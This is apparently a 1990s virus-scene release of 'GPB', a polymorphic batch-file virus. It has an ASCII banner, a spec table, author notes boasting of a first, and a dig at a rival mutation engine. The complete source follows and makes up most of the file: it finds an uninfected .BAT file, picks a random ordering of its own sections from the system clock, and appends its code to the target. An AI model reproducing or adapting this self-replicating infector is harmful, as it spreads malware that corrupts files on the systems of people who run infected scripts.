Bat.FMEB by Reminder


  dTZ=^"~Ob      4GLiTCH@b   fTtZVFgAb
 dJ/     `Gb     ]M!    qS)  1BC    >BD
dW�       `�     �Vb    di/  4*�-+=%�C
[Ii              +-=H>:Ev'   @�F    qBb
qLI    {Onfra]   I;7         i5I     )B
 qN\     >Gp     ?#W         {$L    dYp
  q#=EZXBP'      L2J         L8Z=Kg0aJ

                                by GLiTCH


THE FiRST OLIGMORPHiC BATCH ViRUS USiNG ONLY BATCH SCRiPTiNG!

Virus Name:             GPB
Author:                 GLiTCH
EMail Address:          glitch0@usa.net
Infects:                *.BAT
Polymorphic:            Yes
Encrypted:              No
Stealth:                No
ReadOnly:               No, not yet
Directory traversal:    Not in this version
Notes:                   This is the first batch virus which is polymorphic.
                        This version does not change directory, nor does it
                        infect Read-Only, System or Hidden Batches.

                         The most annoying "bug" about this bug is that it's
                        size increases on EVERY infection, which means, by
                        the 5th infection, it's 190Kb! It's a good job I
                        made it only to infect one batch per run in the
                        current directory ;)

                         Somehow, I don't think this'll spread well, but it
                        it's nice to see a polymorphic batch! :)

                         I think I might write a second varient, possibly
                        with smaller code, and changes directory etc.

                         If you have any comments, or ideas how to optimise
                        my code etc. then email me. And if anyone knows how
                        I could work the virus so it'd didn't copy the
                        appending routines with EVERY section, I will be
                        most gratefull!

/-----------SNIP--------------------------------\
� Death Virii Crew  &  Stealth Group World Wide �
�             P R E S E N T S                   �
�        First Mutation Engine for BAT !        �
�               Without ASM !                   �
�       [BATalia6] & FMEB (c) by Reminder       �
\-----------SNIP--------------------------------/
Hey Reminder, It may be the first mutation engine for
batch, but you have to have ARJ for it to work! Mine
doesn't need it! :) Mine is completely in batch script!

-----------------------------------------------------------------------
@echo off%[GPB_L0.BAT g]%
if not exist %0.BAT goto GPB_Exit
%[0.BAT g]%goto GPB_L3

:GPB_L3
for %%f in (%:GPB_L3%*.bat) do set GPB_File=%%f
%[:GPB_L3]%goto GPB_L5

:GPB_L5
find /i "GPB"<%GPB_File%>nul %[:GPB_L5]%
%[:GPB_L5]%if errorlevel 1 goto GPB_L7
%[:GPB_L5]%goto GPB_Exit

:GPB_L7
%[:GPB_L7]%echo. |time >000
%[:GPB_L7]%find "0:" <000>nul
%[:GPB_L7]%if errorlevel 1 goto GPB_L14
%[:GPB_L7]%find "1:" <000>nul
%[:GPB_L7]%if errorlevel 1 goto GPB_L15
%[:GPB_L7]%find "2:" <000>nul
%[:GPB_L7]%if errorlevel 1 goto GPB_L16
%[:GPB_L7]%find "3:" <000>nul
%[:GPB_L7]%if errorlevel 1 goto GPB_L11
%[:GPB_L7]%find "4:" <000>nul
%[:GPB_L7]%if errorlevel 1 goto GPB_L13
%[:GPB_L7]%find "5:" <000>nul
%[:GPB_L7]%if errorlevel 1 goto GPB_L8
%[:GPB_L7]%find "7:" <000>nul
%[:GPB_L7]%if errorlevel 1 goto GPB_L12
%[:GPB_L7]%find "8:" <000>nul
%[:GPB_L7]%if errorlevel 1 goto GPB_L10
%[:GPB_L7]%find "9:" <000>nul
%[:GPB_L7]%if errorlevel 1 goto GPB_L9
%[:GPB_L7]%goto GPB_L7

:GPB_L8
%[:GPB_L8]%find /i "0.BAT g"<%0.BAT>>%GPB_File%
%[:GPB_L8]%find /i ":GPB_L3"<%0.BAT>>%GPB_File%
%[:GPB_L8]%find /i ":GPB_L5"<%0.BAT>>%GPB_File%
%[:GPB_L8]%find /i ":GPB_L7"<%0.BAT>>%GPB_File%
%[:GPB_L8]%find /i ":GPB_L8"<%0.BAT>>%GPB_File%
%[:GPB_L8]%find /i ":GPB_L9"<%0.BAT>>%GPB_File%
%[:GPB_L8]%find /i ":GPB_L10"<%0.BAT>>%GPB_File%
%[:GPB_L8]%find /i ":GPB_L11"<%0.BAT>>%GPB_File%
%[:GPB_L8]%find /i ":GPB_L12"<%0.BAT>>%GPB_File%
%[:GPB_L8]%find /i ":GPB_L13"<%0.BAT>>%GPB_File%
%[:GPB_L8]%find /i ":GPB_L14"<%0.BAT>>%GPB_File%
%[:GPB_L8]%find /i ":GPB_L15"<%0.BAT>>%GPB_File%
%[:GPB_L8]%find /i ":GPB_L16"<%0.BAT>>%GPB_File%
%[:GPB_L8]%find /i ":GPB_Exit"<%0.BAT>>%GPB_File%
%[:GPB_L8]%goto GPB_Exit

:GPB_L9
%[:GPB_L9]%find /i "0.BAT g"<%0.BAT>>%GPB_File%
%[:GPB_L9]%find /i ":GPB_L5"<%0.BAT>>%GPB_File%
%[:GPB_L9]%find /i ":GPB_L10"<%0.BAT>>%GPB_File%
%[:GPB_L9]%find /i ":GPB_L7"<%0.BAT>>%GPB_File%
%[:GPB_L9]%find /i ":GPB_L14"<%0.BAT>>%GPB_File%
%[:GPB_L9]%find /i ":GPB_L13"<%0.BAT>>%GPB_File%
%[:GPB_L9]%find /i ":GPB_L8"<%0.BAT>>%GPB_File%
%[:GPB_L9]%find /i ":GPB_L3"<%0.BAT>>%GPB_File%
%[:GPB_L9]%find /i ":GPB_L15"<%0.BAT>>%GPB_File%
%[:GPB_L9]%find /i ":GPB_L9"<%0.BAT>>%GPB_File%
%[:GPB_L9]%find /i ":GPB_L11"<%0.BAT>>%GPB_File%
%[:GPB_L9]%find /i ":GPB_L16"<%0.BAT>>%GPB_File%
%[:GPB_L9]%find /i ":GPB_L12"<%0.BAT>>%GPB_File%
%[:GPB_L9]%find /i ":GPB_Exit"<%0.BAT>>%GPB_File%
%[:GPB_L9]%goto GPB_Exit

:GPB_L10
%[:GPB_L10]%find /i "0.BAT g"<%0.BAT>>%GPB_File%
%[:GPB_L10]%find /i ":GPB_L11"<%0.BAT>>%GPB_File%
%[:GPB_L10]%find /i ":GPB_L5"<%0.BAT>>%GPB_File%
%[:GPB_L10]%find /i ":GPB_L14"<%0.BAT>>%GPB_File%
%[:GPB_L10]%find /i ":GPB_L8"<%0.BAT>>%GPB_File%
%[:GPB_L10]%find /i ":GPB_L13"<%0.BAT>>%GPB_File%
%[:GPB_L10]%find /i ":GPB_L15"<%0.BAT>>%GPB_File%
%[:GPB_L10]%find /i ":GPB_L16"<%0.BAT>>%GPB_File%
%[:GPB_L10]%find /i ":GPB_L10"<%0.BAT>>%GPB_File%
%[:GPB_L10]%find /i ":GPB_L9"<%0.BAT>>%GPB_File%
%[:GPB_L10]%find /i ":GPB_L12"<%0.BAT>>%GPB_File%
%[:GPB_L10]%find /i ":GPB_L3"<%0.BAT>>%GPB_File%
%[:GPB_L10]%find /i ":GPB_L7"<%0.BAT>>%GPB_File%
%[:GPB_L10]%find /i ":GPB_Exit"<%0.BAT>>%GPB_File%
%[:GPB_L10]%goto GPB_Exit

:GPB_L11
%[:GPB_L11]%find /i "0.BAT g"<%0.BAT>>%GPB_File%
%[:GPB_L11]%find /i ":GPB_L9"<%0.BAT>>%GPB_File%
%[:GPB_L11]%find /i ":GPB_L13"<%0.BAT>>%GPB_File%
%[:GPB_L11]%find /i ":GPB_L8"<%0.BAT>>%GPB_File%
%[:GPB_L11]%find /i ":GPB_L14"<%0.BAT>>%GPB_File%
%[:GPB_L11]%find /i ":GPB_L11"<%0.BAT>>%GPB_File%
%[:GPB_L11]%find /i ":GPB_L3"<%0.BAT>>%GPB_File%
%[:GPB_L11]%find /i ":GPB_L10"<%0.BAT>>%GPB_File%
%[:GPB_L11]%find /i ":GPB_L16"<%0.BAT>>%GPB_File%
%[:GPB_L11]%find /i ":GPB_L7"<%0.BAT>>%GPB_File%
%[:GPB_L11]%find /i ":GPB_L15"<%0.BAT>>%GPB_File%
%[:GPB_L11]%find /i ":GPB_L12"<%0.BAT>>%GPB_File%
%[:GPB_L11]%find /i ":GPB_L5"<%0.BAT>>%GPB_File%
%[:GPB_L11]%find /i ":GPB_Exit"<%0.BAT>>%GPB_File%
%[:GPB_L11]%goto GPB_Exit

:GPB_L12
%[:GPB_L12]%find /i "0.BAT g"<%0.BAT>>%GPB_File%
%[:GPB_L12]%find /i ":GPB_L13"<%0.BAT>>%GPB_File%
%[:GPB_L12]%find /i ":GPB_L14"<%0.BAT>>%GPB_File%
%[:GPB_L12]%find /i ":GPB_L5"<%0.BAT>>%GPB_File%
%[:GPB_L12]%find /i ":GPB_L12"<%0.BAT>>%GPB_File%
%[:GPB_L12]%find /i ":GPB_L7"<%0.BAT>>%GPB_File%
%[:GPB_L12]%find /i ":GPB_L16"<%0.BAT>>%GPB_File%
%[:GPB_L12]%find /i ":GPB_L11"<%0.BAT>>%GPB_File%
%[:GPB_L12]%find /i ":GPB_L8"<%0.BAT>>%GPB_File%
%[:GPB_L12]%find /i ":GPB_L10"<%0.BAT>>%GPB_File%
%[:GPB_L12]%find /i ":GPB_L9"<%0.BAT>>%GPB_File%
%[:GPB_L12]%find /i ":GPB_L15"<%0.BAT>>%GPB_File%
%[:GPB_L12]%find /i ":GPB_L3"<%0.BAT>>%GPB_File%
%[:GPB_L12]%find /i ":GPB_Exit"<%0.BAT>>%GPB_File%
%[:GPB_L12]%goto GPB_Exit

:GPB_L13
%[:GPB_L13]%find /i "0.BAT g"<%0.BAT>>%GPB_File%
%[:GPB_L13]%find /i ":GPB_L12"<%0.BAT>>%GPB_File%
%[:GPB_L13]%find /i ":GPB_L3"<%0.BAT>>%GPB_File%
%[:GPB_L13]%find /i ":GPB_L14"<%0.BAT>>%GPB_File%
%[:GPB_L13]%find /i ":GPB_L10"<%0.BAT>>%GPB_File%
%[:GPB_L13]%find /i ":GPB_L11"<%0.BAT>>%GPB_File%
%[:GPB_L13]%find /i ":GPB_L9"<%0.BAT>>%GPB_File%
%[:GPB_L13]%find /i ":GPB_L7"<%0.BAT>>%GPB_File%
%[:GPB_L13]%find /i ":GPB_L13"<%0.BAT>>%GPB_File%
%[:GPB_L13]%find /i ":GPB_L16"<%0.BAT>>%GPB_File%
%[:GPB_L13]%find /i ":GPB_L5"<%0.BAT>>%GPB_File%
%[:GPB_L13]%find /i ":GPB_L8"<%0.BAT>>%GPB_File%
%[:GPB_L13]%find /i ":GPB_L15"<%0.BAT>>%GPB_File%
%[:GPB_L13]%find /i ":GPB_Exit"<%0.BAT>>%GPB_File%
%[:GPB_L13]%goto GPB_Exit

:GPB_L14
%[:GPB_L14]%find /i "0.BAT g"<%0.BAT>>%GPB_File%
%[:GPB_L14]%find /i ":GPB_L12"<%0.BAT>>%GPB_File%
%[:GPB_L14]%find /i ":GPB_L3"<%0.BAT>>%GPB_File%
%[:GPB_L14]%find /i ":GPB_L10"<%0.BAT>>%GPB_File%
%[:GPB_L14]%find /i ":GPB_L11"<%0.BAT>>%GPB_File%
%[:GPB_L14]%find /i ":GPB_L9"<%0.BAT>>%GPB_File%
%[:GPB_L14]%find /i ":GPB_L7"<%0.BAT>>%GPB_File%
%[:GPB_L14]%find /i ":GPB_L15"<%0.BAT>>%GPB_File%
%[:GPB_L14]%find /i ":GPB_L13"<%0.BAT>>%GPB_File%
%[:GPB_L14]%find /i ":GPB_L16"<%0.BAT>>%GPB_File%
%[:GPB_L14]%find /i ":GPB_L5"<%0.BAT>>%GPB_File%
%[:GPB_L14]%find /i ":GPB_L14"<%0.BAT>>%GPB_File%
%[:GPB_L14]%find /i ":GPB_L8"<%0.BAT>>%GPB_File%
%[:GPB_L14]%find /i ":GPB_Exit"<%0.BAT>>%GPB_File%
%[:GPB_L14]%goto GPB_Exit

:GPB_L15
%[:GPB_L15]%find /i "0.BAT g"<%0.BAT>>%GPB_File%
%[:GPB_L15]%find /i ":GPB_L13"<%0.BAT>>%GPB_File%
%[:GPB_L15]%find /i ":GPB_L5"<%0.BAT>>%GPB_File%
%[:GPB_L15]%find /i ":GPB_L16"<%0.BAT>>%GPB_File%
%[:GPB_L15]%find /i ":GPB_L12"<%0.BAT>>%GPB_File%
%[:GPB_L15]%find /i ":GPB_L9"<%0.BAT>>%GPB_File%
%[:GPB_L15]%find /i ":GPB_L15"<%0.BAT>>%GPB_File%
%[:GPB_L15]%find /i ":GPB_L7"<%0.BAT>>%GPB_File%
%[:GPB_L15]%find /i ":GPB_L8"<%0.BAT>>%GPB_File%
%[:GPB_L15]%find /i ":GPB_L3"<%0.BAT>>%GPB_File%
%[:GPB_L15]%find /i ":GPB_L10"<%0.BAT>>%GPB_File%
%[:GPB_L15]%find /i ":GPB_L14"<%0.BAT>>%GPB_File%
%[:GPB_L15]%find /i ":GPB_L11"<%0.BAT>>%GPB_File%
%[:GPB_L15]%find /i ":GPB_Exit"<%0.BAT>>%GPB_File%
%[:GPB_L15]%goto GPB_Exit

:GPB_L16
%[:GPB_L16]%find /i "0.BAT g"<%0.BAT>>%GPB_File%
%[:GPB_L16]%find /i ":GPB_L16"<%0.BAT>>%GPB_File%
%[:GPB_L16]%find /i ":GPB_L7"<%0.BAT>>%GPB_File%
%[:GPB_L16]%find /i ":GPB_L14"<%0.BAT>>%GPB_File%
%[:GPB_L16]%find /i ":GPB_L10"<%0.BAT>>%GPB_File%
%[:GPB_L16]%find /i ":GPB_L8"<%0.BAT>>%GPB_File%
%[:GPB_L16]%find /i ":GPB_L3"<%0.BAT>>%GPB_File%
%[:GPB_L16]%find /i ":GPB_L12"<%0.BAT>>%GPB_File%
%[:GPB_L16]%find /i ":GPB_L15"<%0.BAT>>%GPB_File%
%[:GPB_L16]%find /i ":GPB_L5"<%0.BAT>>%GPB_File%
%[:GPB_L16]%find /i ":GPB_L9"<%0.BAT>>%GPB_File%
%[:GPB_L16]%find /i ":GPB_L13"<%0.BAT>>%GPB_File%
%[:GPB_L16]%find /i ":GPB_L11"<%0.BAT>>%GPB_File%
%[:GPB_L16]%find /i ":GPB_Exit"<%0.BAT>>%GPB_File%
%[:GPB_L16]%goto GPB_Exit

:GPB_Exit
%[:GPB_Exit]%del 000
